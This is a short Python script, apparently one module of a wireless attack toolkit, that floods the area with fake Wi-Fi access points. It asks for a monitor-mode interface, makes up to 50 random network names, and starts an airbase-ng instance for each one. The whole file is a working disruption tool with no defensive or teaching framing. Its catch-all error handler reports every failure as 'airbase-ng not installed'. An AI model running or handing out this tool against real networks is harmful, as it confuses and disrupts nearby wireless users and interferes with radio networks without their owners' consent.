#!/usr/bin/env python3
# Beacon Flood Module

import os, sys, time, subprocess, random

def run():
    print("\n" + "="*60)
    print("BEACON FLOOD")
    print("="*60)
    
    interface = input("WiFi interface [wlan0mon]: ").strip() or "wlan0mon"
    count = int(input("Number of beacons [100]: ").strip() or "100")
    
    print(f"\nStarting beacon flood on {interface}")
    print(f"Generating {count} fake APs")
    print("Press Ctrl+C to stop")
    
    try:
        ssids = []
        for i in range(min(count, 50)):
            ssid = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=random.randint(6, 12)))
            ssids.append(ssid)
        
        for ssid in ssids:
            cmd = f"airbase-ng -c {random.randint(1,11)} -e '{ssid}' {interface} &"
            print(f"Creating AP: {ssid}")
            os.system(cmd)
            time.sleep(0.1)
        
        print(f"\nBeacon flood running with {len(ssids)} fake APs")
        
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\nStopping beacon flood...")
        os.system("killall airbase-ng")
        print("Done")
    except:
        print("airbase-ng not installed")
        print("Install aircrack-ng: sudo apt install aircrack-ng")

if __name__ == "__main__":
    run()